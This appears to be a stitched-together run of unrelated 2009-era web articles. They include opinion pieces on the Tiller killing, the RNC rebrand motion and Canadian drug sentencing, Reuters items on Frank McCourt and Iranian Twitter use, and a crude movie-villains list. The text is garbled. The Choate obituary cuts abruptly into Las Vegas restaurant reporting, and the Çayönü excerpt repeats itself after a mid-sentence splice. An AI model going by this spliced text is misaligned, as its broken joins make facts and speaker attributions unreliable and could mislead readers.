I am more concerned that the Obama Administration will use Tiller ’s killing to intimidate pro-lifers into surrendering our most effective rhetoric and actions .
Abortion is still murder .
And we still must call abortion by its proper name ; murder . ”
He continued , “ Those men and women who slaughter the unborn are murderers according to the Law of God .
We must continue to expose them in our communities and peacefully protest them at their offices and homes , and yes , even their churches . ”
There is a difference between protesting against someone , and murdering them .

Another statement of hate came from Operation Save America , “ What was an abortionist doing “ in ” church , any church … being allowed , welcomed , even venerated ?
This man killed babies for a living .
He charged large sums of money to do it .
Then he went to “ church , ” made large contributions , and the “ church ” ( Reformation Lutheran Church ) accepted it ? ? ”
Pastor Mark Holick , Spirit One Christian Center , & OSA .
Rev. Flip Benham , Director of Operation Save America said , “ No doubt the media will paint every Christian , who loves life and lives out that belief in the streets of his city , as a wild - eyed , lunatic , fanatic bent on shooting abortionists .
They will attempt to silence the voice of many by using the violence of one .
This ploy is the devil ’s straw man . ”
The people who are celebrating Tiller ’s death are also claiming to be doing God ’s work with their opposition to abortion .
How can they not see the obvious hypocrisy in their positions ?
They should be appalled by the murder of another human being , no matter what he did for a living .
Instead , they are frightened that Tiller ’s murder will hurt their jihadist crusade against abortion .
For his part President Obama said , “ However profound our differences as Americans over difficult issues such as abortion , they can not be resolved by heinous acts of violence . ”
Obama is correct .
Most anti-abortion groups were quick to put out statements denouncing the violence , but a few radicals think this is a day to celebrate , but I do n’t think murder and domestic terrorism are anything that should be celebrated .

The Republican National Committee is voting this week on whether or not to adopt a fully fantasy - based platform .
The party is considering a motion to rebrand the Democratic party , over which they have no authority , the ‘ Democrat Socialist party ’ .
The move has been ridiculed by some in the party , as well as by members of the FOX News team , often considered friendly to the Republican party and its agenda .
With the election of 2008 having been seen by many as a sign that the party was gravely out of touch with the direction of the country or the realities lived by average citizens , 2009 has seen a bizarre rash of fantasy - based behavior from the GOP .
In February , House leaders called a press conference to present their alternative federal budget proposal : it was 19 pages long , was described as containing roughly 8 cover pages , and only a brief outline of concepts , with no numbers and no forecasts for spending .
What ’s more , the outline of concepts revolved around tax cuts : for industry , for the wealthy , even for businesses moving jobs overseas .
Over the course of ten days , the party descended into infighting as attempts to lay blame for the debacle distracted from attempts to actually craft a budget proposal .
When that proposal was offered , on the day of the actual budget vote ( i.e. , with no possibility of the alternative being considered ) , the calculations were still incoherent , incomplete , and included a $ 1.7 trillion deficit , no improvement on the Democratic proposal .
[ ad #cafsen - intext ]
When Pres. Obama toured Europe , the Republican party was vehemently opposed to any language he used that recognized the US may have been an imperfect partner in the past .
The GOP so vehemently pushed the idea of American infallibility that they tried to paint Obama ’s hugely successful diplomatic efforts , including record commitments for a global economic stimulus , as a sign of weakness , because somehow the language proved weakness .
When he was gracious enough to greet Hugo Chávez at the Summit of the Americas , and receive a book from him criticizing American foreign policy , the Republican party launched a national campaign to paint Obama as weak and as having jeopardized America ’s national security by shaking hands and accepting the book .
That Obama ’s presence had altered the entire hemispheric dynamic , causing Chávez and others to look to him for leadership and to court his good graces , was irrelevant to the machinery of systematic fantasism that has overtaken the national party .
They predicted the demise of American power and the rise of a Latin American socialist power that would do away with the American way of life … because two men shook hands , and despite the signs that demonstrated vastly expanded American credibility in the region .
Now , the Republican party wants to strip its own national committee of funding authority .
This would free ideologues and regional power - brokers to do as they see fit .
It would further regionalize and marginalize the Republican party in the national political sphere , and further separate their public image - making from the realities of national politics .
So , to add to that fantasy - driven strategy for achieving “ ideological purity ” the party has decided it is a matter of grave national priority for the minority party to re-brand the majority party using a non-existent adjective ( Democrat is a noun , not an adjective ) and a term not applicable to the Democratic agenda ( however much the Republican party is desperate to call itself less socialist than its rival ) .
The irony of it all is that the most vast expansion of government spending in the history of the United States took place first with a Republican Congress ( both houses ) and George W. Bush in the White House , achieving the first ever $ 3 trillion budget .
Pres. Clinton ’s final budget , for fiscal year 2001 , by comparison , was only $ 1.9 trillion .
What ’s more , Bush ’s budgets did not count Iraq and Afghanistan war funding .
Obama ’s budget looks dramatically bigger than Bush ’s exclusively because he integrated planned war spending into the national budget .
Not including it was a means of skirting provisions in federal law that are designed to keep spending low where possible .
Bush ’s war supplementals were designed to be bloated and to be political quicksand that no member of Congress would vote against or seek proper oversight over .
Then came George W. Bush ’s own Red October .
The collapse of the American financial system caused the Treasury Department and Federal Reserve , under Republican president George W. Bush , to seek the spending of multiple trillions of dollars in loans , grants and buyouts , to bail out the nation ’s largest banks .
Over $ 150 billion was given to AIG alone .
The government effectively nationalized the nation ’s largest insurer and several large banks , taking huge ownership stakes and ushering in an era in which regulation or direct control were the two remaining options for marketplace governance .
That was the Republican party ’s true struggle with socialism .
But now , we have a party out of power , disgraced by its former leaders and reeling from a consistent inability to understand the issues of the day or the priorities of the average citizen , seeking to rebrand its opponent with a word that more accurately describes their own actions over the last 8 years .
And even that part of this story is based on a fantasy : we are hearing daily the outcries and recriminations from Republican leaders who speak of the evil Democratic plan to establish a nationalized healthcare system in which the government will dictate to individuals whether or not they should die from routine ailments .
The language is , far beyond inflammatory , taken from an alternate universe , because no such national system has been proposed .
Obama ’s plan is for universal coverage , not a single - payer national system .
His plan is designed to support the private sector healthcare system , and even permit currently unsustainable and overburdened insurers to become sustainable businesses over the long term .
The plan is aimed at achieving “ quality , affordable healthcare for all Americans ” , not a free - for - everyone single - payer socialist authority .
The plan is intended to give more people access to more care and with better quality and more options .
So , the Republican party seeks to raise its national profile by using a phantom adjective and a phantom menace to rename a party that has no intention of renaming itself and would not be adequately described by the proposed rebranding .
Can it be justified as a complaint ?
An opinion ?
A profession of faith ?
Maybe .
And the Republican party has a right to that , as does anyone , but blind faith in false claims does not a majority make .
There is a real danger for the Republican party , going forward , if the RNC not only approves this absurdist vocabulary stunt , but if members of the party begin parroting the term in robotic allegiance to the party ’s new fantasy agenda .
The danger is that every potentially serious figure in the party will be seen to be a know - nothing lout , incapable of speaking about reality and wasting the public ’s time with a relentless propaganda lesson aimed at nudging the public into this fictional universe that serves no one ’s interest except those Republicans who would otherwise be unfit for public office .
As Neal Cavuto said yesterday on FOX News : “ I see a party in a heap of trouble and the last thing you want to do when you ’re in a heap of trouble is dig a ditch deeper .
So put down the shovels and deal with some issues . ”
The RNC is going out of its way to demonstrate the party ’s willing irrelevance to the problems facing the nation , and it may reap what it has sown as Democratic party measures are seen to be the only responsible choice for government in 2010 , however imperfect they may be .
If it were n't so freaking irritating , I 'd laugh over the video called " Our Created Solar System " presented at a website called Creation Astronomy .
As you might expect , it 's purporting to have evidence that the Universe is n't 13.7 billion years old , but is instead some integrally - multiple number of begats old .
I watched the Jupiter video until all I could hear was a loud buzzing sound punctuated by the word " evolution " .
Last I recall , evolution was the change in allele frequency over time ...
Jupiter has chromosomes ?
Are creationists that confused ?
Well , certainly many are , but why ascribe to ignorance what can be ascribed to misdirection ?
The creator of the video obviously uses the word evolution over and over again because it's a buzzword likely to sway people predisposed against science to agree with the bizarre version of reality he espouses , even though he must know that evolution has nothing to do with astronomy .

A stone age social revolution
We begin with ' a patriarchal society of bitter destructiveness : the gloomy temples dug into the mountain like caves served to maintain power in a society that was obviously rigidly organized through open terror : human sacrifices .
In the temples of all building levels huge amounts of blood were shed which the excavators retrieved in thick crusts on daggers , altars or draining funnels which were designed specifically for that purpose .
The analysis of the isolated blood pigment haemoglobin revealed that it was generally human blood .
In the chambers of one of these temples there were the skulls of more than 70 people and parts of skeletons of more than 400 different individuals " neatly stacked up to the ceiling " . '
So far , so familiar .
We 've all seen depictions of societies like that , in Conan movies if nothing else .
However ...
' On a certain day 9200 years ago the manorial houses at the north side of the large square in Çayönü were burnt down , and this happened so fast that the owners were not able to save any of their treasures .
The temple was torn down and burnt , and even the floor was ripped open , the stone pillars around the free space were taken down and the taller of them were broken up .
The place itself - previously maintained and kept meticulously clean for more than 1000 years - was converted into a municipal waste dump .
After a short chaotic transition all houses had been torn down .

I can't help being thrilled at the thought of these stone age revolutionaries , burning the big houses of the masters and storming that terrifying temple , perhaps fearfully at first , then joyfully turning the gruesome house of the gods into a tip .
But we all know what happened next , do n't we ?
The new society of equals was crushed by outside invasion , or a new caste or class of officials arose and things were soon worse than before ... something like that , yes ?

The site from which I 've excerpted the above quotes ( stripping out the numerous references to the archaeological literature ) interprets this stone age classless and stateless society as We begin with ' a patriarchal society of bitter destructiveness : the gloomy temples dug into the mountain like caves served to maintain power in a society that was obviously rigidly organized through open terror : human sacrifices .
In the temples of all building levels huge amounts of blood were shed which the excavators retrieved in thick crusts on daggers , altars or draining funnels which were designed specifically for that purpose .
The analysis of the isolated blood pigment haemoglobin revealed that it was generally human blood .
In the chambers of one of these temples there were the skulls of more than 70 people and parts of skeletons of more than 400 different individuals " neatly stacked up to the ceiling " .

We 've all seen depictions of societies like that , in Conan movies if nothing else .
However ...' On a certain day 9200 years ago the manorial houses at the north side of the large square in Çayönü were burnt down , and this happened so fast that the owners were not able to save any of their treasures .
The temple was torn down and burnt , and even the floor was ripped open , the stone pillars around the free space were taken down and the taller of them were broken up .
The place itself - previously maintained and kept meticulously clean for more than 1000 years - was converted into a municipal waste dump .
After a short chaotic transition all houses had been torn down .

* McCourt wrote unsparing memoir of childhood in squalor
* “ Angela ’s Ashes ” won Pulitzer Prize , made into movie
NEW YORK , July 19 ( Reuters ) - Frank McCourt , the Irish American author best known for the Pulitzer Prize - winning memoir “ Angela ’s Ashes ” that chronicled his impoverished upbringing , died on Sunday , The New York Times reported .
He was 78 .
The newspaper said the cause was metastatic melanoma , according to an executive of Scribner , the author ’s publisher .
A school teacher who came to writing late in life , McCourt won acclaim with his poignant , extraordinarily bleak picture of a childhood growing up in the slums of the Irish city Limerick .
“ Angela ’s Ashes ” brought McCourt a 1997 Pulitzer Prize , the National Book Critics Circle Award and other honors .
Millions of copies of the book were sold worldwide and it was adapted into a 1999 movie starring Emily Watson and Robert Carlyle .
McCourt turned to his life in the United States for subsequent books , “ ‘ Tis ” and “ Teacher Man . ”
Born in New York City , he was the eldest of seven children born to Irish immigrant parents .
“ Angela ’s Ashes ” was an unsparing memoir that captured a feckless , drunkard father with a gift for story - telling .
When not drunk , his father was absent , turning his back on a family so poor , McCourt wrote , that they were reduced to burning the furniture in their rented hovel to keep warm .
Already struggling when the Great Depression hit , the family moved back to Limerick , where they slipped ever deeper into poverty in the 1930s .
Three of McCourt ’s siblings died of diseases worsened by hunger and the squalor of their surroundings .
McCourt himself almost died of typhoid fever as a child .
“ When I look back on my childhood I wonder how I managed to survive at all , ” McCourt wrote .
“ It was , of course , a miserable childhood : the happy childhood is hardly worth your while .
Worse than the ordinary miserable childhood is the miserable Irish childhood , and worse yet is the miserable Irish Catholic childhood . ”
In “ Angela ’s Ashes , ” he wrote of hunger , a home flooded with rainwater and the grinding humiliation of seeking handouts from charities in the hardscrabble Irish city .
But his vivid prose captured the speech and quirks of a gallery of relatives , leavening a truly harrowing childhood with compassion and humor .
After leaving school at 13 , McCourt supported his mother and brothers and sisters with occasional jobs and petty crime .
At 19 , he returned to the United States , finding work at a New York hotel .
He subsequently trained as a school teacher , only later becoming a published writer .
His brother , Malachy McCourt , is an actor and author who has appeared in numerous film , television and theater productions .

Keith Robertson , the founder of Kuler Software Tools , has written a Smalltalk - inspired language for the .NET platform called SABLE , a language meant to draw upon the qualities of Smalltalk ’s syntax and the benefits of running on CLR .
SABLE is a general purpose , imperative , OOP language with a syntax similar to Smalltalk ’s , but the object and deployment model show its affiliation to the .NET family .
SABLE programs run on ECMA CLR .
SABLE wants to be Smalltalk for the web , a language that preserves the high readability and type safety of the Smalltalk language but with type information included in assemblies and a smaller binary output to make it usable for web deployment .
Robertson declares that his ultimate purpose with SABLE is :
To create a fluid , flexible , Smalltalk - style environment for development , but when you are ready , the application compiles down to an ordinary assembly . …
This will give you a highly dynamic development experience without requiring a dynamic runtime .
One of the key benefits of SABLE would be Smalltalk ’s messaging syntax allowing for messages to be chained or cascaded .
The language is supposed to do type checking at compile time and to support type casting even through message chains , but not only :
|typeDecl| := nodeStack pop. nodeStack peek ~ { BLOCK_NODE} argumentNodes last ~ { ARGUMENT_NODE} typeDeclNode : typeDecl .
The language can do bi-directional type inference , deducting the type of a variable or a method from the expression ’s type ( outward inference ) , or deducting the expression ’s type from the expected type ( inward inference ) .
SABLE uses method , class and assembly structure definitions for documentation purposes but , unlike Smalltalk , the metadata stays with the assemblies .
Macros are always inline methods .
An interesting use of macros is to augment existing closed libraries .
SABLE does not have reserved words , but it has a number of predefined identifiers .
Other important features are : class extensions , contracts , full access to CLR features like generics , nested types , metadata attributes , etc .
A more than basic “ Hello World ” example looks like this :

LONDON ( Reuters ) - Supporters of defeated Iranian presidential candidate Mirhossein Mousavi posted defiant messages on Twitter on Tuesday , calling for a second banned pro-Mousavi rally to go ahead and offering security updates .
A screen grab of Twitter.com .
REUTERS/www.twitter.com
Social networking websites such as Twitter and Facebook have become a focal point for young , urban Iranians opposed to President Mahmoud Ahmadinejad , who defeated Mousavi in Friday ’s presidential election and whose government controls the state media .
“ Alert : Mousavi march still on .
5 PM , ” read one short message , or “ tweet , ” on Twitter .
“ Good luck at the march .
Do n’t take cars , they will be waiting for you when you return to them , ” read another , as tweets on the subject of the Iranian election poured onto the site every few seconds .
A U.S. official said meanwhile that the U.S. State Department had contacted Twitter at the weekend to urge it to delay a planned upgrade that could have cut daytime service to Iranians .
“ We highlighted to them that this was an important form of communication , ” the official said of the conversation the department had with Twitter .
The official , speaking in Washington , declined further details .
The request was made despite the Obama administration ’s stated concern not to meddle in the post-election dispute .
Twitter had said earlier it had delayed the upgrade , without mentioning any contact with the U.S. government .
BLOCKED TEXT MESSAGES
The Iranian government blocked SMS text messages during polling after opposition candidates used them to galvanize key young voters during the fiercely contested election campaign , and Tehran residents were still unable to send SMSs on Monday .
The BBC ’s Persian service was also blocked .
Social networking site Facebook , which has about 150,000 members in Iran , said on Monday it had had reports that some users in Iran were having difficulties accessing Facebook .
“ This is disappointing , especially at a time when citizens are turning to the Internet as a source of information about the recent election , ” it said in a statement .
Twitter Inc said in a blog post on its site it was delaying a planned upgrade because of its role as an “ important communication tool in Iran . ”
The hourlong maintenance was put back to 5 p.m. EDT / 2100 GMT , which corresponds to 1:30 a.m. on Wednesday in Iran .
It said the upgrade had originally been planned for Monday night in the United States , which would have cut daytime service in Iran on Tuesday .
Unrest has rocked Tehran and other cities since the Interior Ministry released results on Saturday that showed hard - liner Ahmadinejad had defeated Mousavi by a landslide .
Mousavi has appealed to Iran ’s top legislative body to annul the result because of irregularities , a charge the Interior Ministry and Ahmadinejad have dismissed .
The Guardian Council said it was ready to carry out a partial recount .
According to Internet censorship monitor OpenNet Initiative , Iranians began taking to the Internet in droves during the 1997-2005 presidency of Mohammad Khatami , when dozens of independent publications were shut down and journalists jailed .
In a 2007 report on Iran , the OpenNet Initiative estimated there were about 400,000 blogs in Farsi , as publishing on the Internet exploded , despite what it called “ one of the most extensive technical filtering systems in the world . ”
More than 23 million Iranians in a country of 70 million -- more than 60 percent of whom are under the age of 20 -- have access to the Internet .
Facebook was shut off in Iran on May 23 , joining political and human - rights websites which had already been blocked .
The ban was lifted on May 26 , following strong criticism from moderate candidates .
Mousavi has almost 48,000 supporters on his main Facebook page .
Ahmadinejad also has a page with 2,615 fans , while the “ I bet I can find 1,000,000 people who dislike Mahmoud Ahmadinejad ! ” group has more than 57,000 members .

Robert B. Choate Jr. , who gave up an engineering career to devote himself to fighting against poverty and malnutrition , seizing national attention in 1970 by telling a Senate subcommittee that most breakfast cereals barely qualify to be called food , died on May 3 in Lemon Grove , Calif .
He was 84 .
Mr. Choate ’s son Valerian said he died as the result of a medical condition that prevented him from swallowing .
Mr. Choate , superficially a tweedy , bow - tied Boston Brahmin , decided in midlife that he wanted to rankle feathers .
An early step was publishing a magazine in Phoenix , where he moved in the late 1950s , that deliberately irritated the city ’s conservative establishment .
Soon he was at the center of a roiling national discussion of how to best use America ’s agricultural bounty to nourish its people .
“ He was one of a half - dozen people who brought health and malnutrition to the eyes of the public , ” Nick Kotz , author of “ Let Them Eat Promises : The Politics of Hunger ” ( 1969 ) , said in an interview .
But for many Las Vegas restaurateurs , flat is still the new up , and for some , “ being down 10 percent , that ’s the new flat , ” said Joseph Bastianich , Mario Batali ’s partner in three restaurants at the Venetian Resort Hotel and Casino .
Mr. Bastianich said his Carnevino Italian Steakhouse in the Palazzo at the Venetian was projecting $ 18 million in revenues this year but now “ we expect to do $ 13 million to $ 14 million . ”
Sirio Maccioni , a Las Vegas fine - dining pioneer with his restaurants Le Cirque and Osteria del Circo at the Bellagio , cautioned that “ it will take a very long time for it to come back to the way it was . ”
He noted that recently revenues from his restaurants have been down 5 to 10 percent , and last year were off 25 percent .
Waiters at high - end properties have suffered a reduction in tips from 20 to 50 percent .
“ Our membership has declined 10 or 11 percent since last year , ” said D. Taylor , the secretary treasurer of the Culinary Workers Union Local 226 , which represents 50,000 food and beverage workers and other employees in hotels and casinos .
Mr. Martinez of Rao ’s said the staff had agreed to a reduction in the workweek from 5 days to 4 , and in the workday from 8 hours to 6 , just to save all their jobs .
He estimated the average check cost for his tables was down $ 30 , to $ 50 .
And a grim recession game of musical - chair seniority has commenced .
Francisco Rufino , a 33 - year - old fry cook at the Paris Las Vegas casino hotel for the last nine years , was bumped down to a cafe there because of cutbacks at a higher - end casino restaurant .
“ In turn , I displaced another cook  who was laid off , ” he said .
Nevertheless , many still have hopes .
Mr. Bastianich is planning a restaurant at the Venetian , tentatively titled Nancy ’s Luncheonette , offering the food of Nancy Silverton , his Los Angeles partner in Osteria Mozza with Mr. Batali .
Psychonauts and Brütal Legend designer Tim Schafer has said that the biggest barrier between fresh audiences and videogames is a lack of varied subject matter .
Stating that games need to get beyond just a handful of basic genres , the respected game creator posits that the industry has a long way to go if the mainstream will embrace the medium .
" I think it 's a subject matter barrier .
Not everybody wants to get into these super violent worlds and yet here I am making a game about broad axes and decapitation , " he explains .
" But I think humour would get more people into games .
" It 's getting better , it used to be that the games industry had a short list of inspirations .
You had Tolkien - esque fantasy , Star Wars , and then new things get added .
I think GTA brought a whole new level of inspiration .
And I think the broader that gets , the more people will be interested in games .
" If you look at movies , they deal with everything about life .
They deal with all aspects of life : romance , comedy , serious dramas .
And games are mostly limited to the summer action blockbuster .
They have n't really gone outside of that .
But I think they will , and hopefully they will soon , or else people will be solidified in their view of games .
Their expectations are set . "
I would love to see videogames get big enough balls to tackle meatier subject matter , but I must disagree that it 's limited themes that are proving to be a barrier .
If anything , the Wii has proven that it 's significant simplicity and a further dumbing down of videogames that attract new people .
Still , show me a good romantic comedy videogame and I 'll be convinced that games have arrived .
Justice Minister Rob Nicholson delighted many police officers on Friday ( February 27 ) when he came to Vancouver to announce mandatory minimum sentences for drug traffickers .
It ’s part of a criminal - justice bill that the Conservatives have reintroduced before Parliament .
I ’m not convinced that this is good public policy , and I base it on the experience of three young people I knew in Victoria during my wilder teenage years .
They went to many of the same parties I attended .
They were intelligent , well - spoken , and never violent .
But their judgment was n’t as good as it could have been when they came up with a crazy idea to import cocaine from nearby Washington state on a zodiac dinghy .
They were n’t doing this very long before they were arrested on the docks .
At the time , Canada ’s Narcotic Control Act carried a mandatory seven - year minimum sentence for importing cocaine .
Their friends were all stunned by the news .
These were young men who obtained good grades in school .
They were n’t gangsters in the conventional sense of the word .
They were ambitious , popular , and respected .
They ’ve since gone on to enjoy some success in life , so I ’m not going to reveal their names now .
One of them had a lawyer who pleaded him guilty to the crime .
He received the automatic seven - year mandatory minimum sentence , and spent part of that time in William Head prison .
He later did very well at Simon Fraser University .
I recall he went to work in Japan .
The second one did n’t do any time in jail .
I saw him in Vancouver a few years later , and he was doing fine .
The third one had a lawyer who would n’t let him plead guilty to importing cocaine .
He received an 18 - month sentence on a lesser charge .
I remember visiting him in what was then the Brannen Lake minimum - security correctional centre .
He told me it was an awful experience , and he never wanted to return to jail again .
He said people were making booze out of anything they could get their hands on .
He had learned his lesson .
I saw him a few years later , and he had a respectable job .
None of them should have faced the prospect of a seven - year mandatory minimum sentence for being so stupid and greedy at such a young age .
I believe that after police put handcuffs on them , these three young men had already learned their lesson and were unlikely to repeat this criminal activity .
A few years later in 1987 , the Supreme Court of Canada ruled that the seven - year minimum sentence for importing cocaine was unconstitutional .
In R. v. Smith , Canada ’s highest court declared that the seven - year minimum sentence for importing cocaine under the Narcotic Control Act violated the Canadian Charter of Rights and Freedoms because it constituted cruel and unusual punishment .
“ The court in assessing whether a sentence is grossly disproportionate must consider the gravity of the offence , the personal characteristics of the offender , and the particular circumstances of the case to determine what range of sentences would have been appropriate to punish , rehabilitate , deter or protect society from this particular offender , " the judgment stated .
“ The court must also measure the effect of the sentence , which is not limited to its quantum or duration but includes also its nature and the conditions under which it is applied .
The determination of whether the punishment is necessary to achieve a valid penal purpose , whether it is founded on recognized sentencing principles and whether valid alternative punishments exist , are all guidelines , not determinative of themselves , to help assess whether a sentence is grossly disproportionate .
Arbitrariness is a minimal factor in determining whether a punishment or treatment is cruel and unusual . ”
Nicholson ’s new bill features a two - year minimum sentence for growing 500 marijuana plants or more .
This ensures that anyone who is convicted has a decent chance of doing time in a federal prison , where inmates are often more brutal .
Nicholson and his boss , Prime Minister Stephen Harper , obviously do n't think this constitutes cruel and unusual punishment because otherwise , they would n't have introduced it .
In addition , Nicholson 's bill will double the maximum penalty for running a marijuana grow - op to 14 years .
Drug traffickers who are involved in “ organized crime ” or if weapons are involved will receive mandatory minimum sentences of one year .
But if this activity occurs near a school , that will be doubled to two years .
These punishments are n’t as onerous as the old mandatory minimum seven - year sentences for importing cocaine .
But they do seem to disregard the Supreme Court of Canada ’s cautionary words from 1987 that that the court can assess whether a sentence is “ grossly disproportionate ” by examining whether punishment is necessary to achieve a valid penal purpose or whether valid alternative punishments exist .
That 's what judges are supposed to consider .
But in the Harper era , we 've learned , judges are not to be trusted to exercise this discretion .
So that 's why we 're going to get mandatory minimum sentences for growing marijuana in this country , and we can expect that more teenagers are going to rot in federal jails .

Ahhh movie assholes ... without them , the heroes would n't have as much adversity to overcome .
Without them , the stories would n't be nearly as interesting .
It 's with this in mind that I 'm starting up a new series of articles here on I - Mockery that pays tribute to some of my favorite assholes in the history of film .
Some are the kind you love to hate , others are the kind you hate to love ... either way , they added something special to the films they appeared in to make them unforgettable .
So let 's begin with the first installment in this ongoing series of my favorite movie assholes .
Walter Peck in " Ghostbusters "
Played by William Atherton , the character of Walter Peck is the official asshole in the original Ghostbusters movie , clearly trying to make a name for himself by trying to put an end to their ghostbusting business .
After all , if it was n't for him , all of the supernatural entities that the Ghostbusters captured would n't have been released from the containment facility , paving the way for Gozer to bring chaos and destruction to the city of New York .
Few things are as entertaining as watching Venkman admit to the mayor of New York , " Yes it 's true .
This man has no dick . " which drives Pecker apeshit with anger .
Of course , the big payoff is when we get to see Peck , or " Pecker " as Venkman calls to him , drenched in molten marshmallow after the Ghostbusters fry the Stay Puft Marshmallow Man .
I 'm guessing I 'm not the only one when I say I wish it was the remains of the Stay Puft Dookie Man that landed on Pecker instead .
Some of you might recognize him from other movie roles too , such as Richard Thornburg in Die Hard ( another asshole ) .
One can only hope that this guy still has assholish characters in his arsenal just waiting to be unleashed upon moviegoers .
Iceman in " Top Gun "
Who gets up in somebody 's face and chomps their teeth together as a display of his prowess ?
Iceman does , that 's who .
Granted , just about everybody in Top Gun was an asshole in some shape or form ... well , except for Goose , and we all know what happened to him .
Of course , everybody remembers the end of the movie when Maverick saved the day and Iceman still has the nerve to say , " You can be my wingman anytime . " to which Maverick responds , " Bullshit !
You can be mine . "
After this , we see them laugh 'n all , but you know , deep down inside that little jab was just eating Iceman up and I 'm willing to bet there 's a director 's cut out there where you see Iceman ripping out Mav 's testicles in an act of jealous rage .
Well either that , or he massages Mav 's testicles , what with them being totally gay for one another 'n all ....
Mick McAllister in " Teen Wolf "
Now this is a great example of one o' my favorite stereotypical asshole characters : the mean asshole who does n't like somebody because they look different .
Mick McAllister is a slow - moving , huge - eyebrowed , caveman - like arrogant asshole who clearly believes himself to be cooler than god .
His assholishness can be found throughout the film , such as when he taunts the overweight basketball player and says , " Shoot it , Fatboy ! "
Then again , the actual name of that character was " Chubby " so perhaps the writer was the real asshole here .
Anyway , the main target of Mick 's disdain is of course Scott Howard , the teenage boy played by Michael J. Fox who just happens to be a werewolf .
Mick does n't like all the attention that Scott is getting now , because before he " wolfed out " , nobody cared about him that much .
When his girlfriend starts to pursue Scott as well , Mick decides to knock his ego down a few notches with this little speech : " You do n't scare me , freak .
Underneath all that hair , you 're still a dork , Scott .
I 've handled your kind before .
Your mama used to steal chickens out of the backyard until I blew her head off with a shotgun .
Right , Scott ? "
That right there is 100 % pure unfiltered asshole , my friends .
Mick manages to be an asshole all the way to the end of the movie , never changing his ways , because he constantly fouls Scott in the championship basketball game and stands under the basket ( which would be illegal to do in any real gamel ) while staring Scott down as he has to make the last two foul shots .
Of course , this being an 80s movie , it ends with a lesson about just being yourself instead of a show - off as Scott ( in normal human form ) makes the last two shots and wins the championship .
Mick is just left standing there with that " not a thought going through this guy 's head " look on his face , and even his girlfriend ( who is an asshole in her own right ) leaves him .
Suck on that , Mick .
Viking Lofgren in " Bad Boys "
Ok , this is an interesting take on the typical bullying asshole character that we 've seen in so many movies .
The movie takes place in a juvenile correctional facility where a guy who is bestowed with one of the greatest character names in the history of film , Viking Lofgren * , is the alpha male amongst all the inmates .
And it 's no wonder , he looks like he's at least 10 years older than all of 'em , but perhaps that 's just because he 's a big guy with an amazing hair helmet .
Throughout the movie , he acts like an asshole , treating everybody around him like dirt and giving the new guy , Mick , " shithouse detail " ( cleaning the bathrooms ) .
What makes this character so amusing , is for all of his intimidating stares and warning , Viking has got to be one of the biggest pussies in the history of bullying .
First , he gets his face bashed in with a pillowcase filled with soda cans and loses his status as the alpha male .
Then , to add insult to injury , the scrawny little kid ( Horowitz ) dumps an entire load of food on his head and then kicks him in the nuts as the entire cafeteria cheers him on .
And last but not least , young Horowitz turns Viking 's radio into a bomb which explodes in his face .
For a a big , tough asshole , Viking seriously gets his ass kicked throughout the entire movie .
I , for one , can never get enough of watching him get beaten to a pulp with cans of soda .
* Real Vikings were absolute badasses .
This guy is clearly not a real Viking .
Dutch in " The Karate Kid "
Do n't get me wrong , Johnny Lawrence is one hell of a shining example of the perfect movie asshole , and many people consider him to be the greatest of all time .
I 'm sure I 'll get to discussing him eventually in this series of asshole tribute articles , but for now , I ask you to hear me out because there was another asshole in the movie who always caught my attention .
No , not John Kreese , though he was amazing as well .
I 'm talking about Dutch , the cockiest little shit in the entire Cobra Kai karate gang !
Not only is his harassment of Daniel , or " Danielle " as he likes to pronounce it , absolutely impeccable what with his whole " Points or no points , you 're dead meat . " taunting , but just look into his eyes .
Those overconfident wide eyes , that cocky grin ... have you ever seen a guy so full of himself ?
He hops around the tournament floor like a goddamned jumping bean and when he kicks Daniel in the eye , he 's quite proud of himself .
Furthermore , his real name is Chad .
It 's clear to me that he was born to play the asshole role of Dutch .
Considering how pretty much everybody involved with Cobra Kai was a complete asshole , I must give a tip o' my hat to Dutch for standing out from the rest o' the pack .
Dead meat !
Buddy Ackerman in " Swimming With Sharks "
This is one of those movies that I 've always felt was extremely underrated , but that 's probably because it was promoted as an " uproarious gut busting comedy !!!@!ROFL !@%*#$@ @ %$ ! " when it 's actually a brilliant blend of dark humor and drama .
Swimming With Sharks is all about the movie making business and Buddy Ackerman ( Kevin Spacey ) is a bigtime producer who hires Guy to be his personal assistant .
Wait , did I say " personal assistant " ?
I 'm sorry , I meant to say " verbal punching bag " instead .
When it comes to verbally abusive bosses , Buddy Ackerman takes the cake with his brutal honesty and his ridiculous demands .
Here are a few glorious examples of his abuse of Guy :
-" You 're happy !
I hate that ! "
-" You are nothing !
If you were in my toilet I would n't bother flushing it .
My bathmat means more to me than you ! "
- " What I am concerned with is detail .
I asked you go get me a packet of Sweet - N - Low .
You bring me back Equal .
That is n't what I asked for .
That is n't what I wanted .
That is n't what I needed and that shit is n't going to work around here .
Do me a fucking favor .
Shut up , listen , and learn .
Look , I know that this is your first day and you do n't really know how things work around here , so I will tell you .
You have no brain .
No judgment calls are necessary .
What you think means nothing .
What you feel means nothing .
You are here for me .
You are here to protect my interests and to serve my needs .
So , while it may look like a little thing to you , when I ask for a packet of Sweet - N - Low , that 's what I want .
And it 's your responsibility to see that I get what I want . "
Of course , a man can only take so much , even a schmuck like Guy ... so he eventually snaps , takes Buddy hostage and proceeds to beat and torture him as payback for all the abuse .
Look , these are the risks you take when you decide to make being an asshole your full - time job .
Way it goes .
R.J. Fletcher in " UHF "
Now what list of movie assholes would be complete without at least one rich company executive who wants to shit on all the fun that " the little people " are having ?
Enter R.J. Fletcher from " Weird Al " Yankovic 's classic cult comedy , UHF .
George Newman has just been given a chance to bring a fledgling local TV station back to life , and when he manages to turn it into a success ( thanks to Stanley Spadowski and his mighty mop of justice ) , the owner of the rival network station R.J. Fletcher does everything in his power to stop them .
But it 's not just his attacks on the UHF station that makes him an asshole , it 's how he treats everybody around him .
For one thing , he fired Spadowski because he believed that he lost some important papers of his , when in fact that had been in his chair all along .
A nice person would 've apologized to Spadowski and re-hired him instantly , possibly giving him a raise too , but not R.J .
He just laughs the whole thing off and does n't even seem to care that he just canned an honest , hard - working janitor .
He 's also extremely politically incorrect .
For example , when some of his employees mock Pamela Finklestein ( a news reporter for the UHF station ) , she complains to R.J. and he sarcastically responds , " Why , that 's a terrible thing .
I do n't know how many time I 've told those boys , never call chicks broads . "
Of course , he gets what 's coming to him towards the end of the movie , when he 's unknowingly broadcast to the entire community as he gives the following speech which reveals just how big of an asshole he truly is :
" This community means about as much to me as a festering ball of dog snot .
You think I care about the pea - brained yokels of this town ?
If you took their combined I.Q. , and multiplied it by a hundred , you might have enough intelligence to tie your shoe , if you did n't drool all over yourself first .
I can't stand those sniveling maggots .
They make me want to puke .
